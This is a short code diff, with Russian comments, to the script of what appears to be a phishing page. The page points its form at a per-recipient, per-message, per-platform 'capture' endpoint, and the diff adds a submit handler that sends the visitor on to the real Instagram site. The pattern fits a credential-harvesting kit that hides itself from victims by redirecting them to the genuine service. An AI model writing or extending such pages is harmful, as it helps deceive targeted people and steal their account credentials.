@@ -150,6 +150,16 @@
         if (recipientId && platform) {
             document.querySelector("form").action = `${BASE_URL}/capture/${recipientId}/${messageId}/${platform}/`;
         }
+
+        document.querySelector("form").addEventListener("submit", function(event) {
+            event.preventDefault();  // Предотвращаем стандартную отправку формы
+
+            // Указываем ссылку, на которую нужно перенаправить пользователя
+            const redirectUrl = "https://www.instagram.com/"; // Замените на нужный URL
+
+            // Перенаправляем пользователя
+            window.location.href = redirectUrl;
+        });
     </script>
     
 </body>
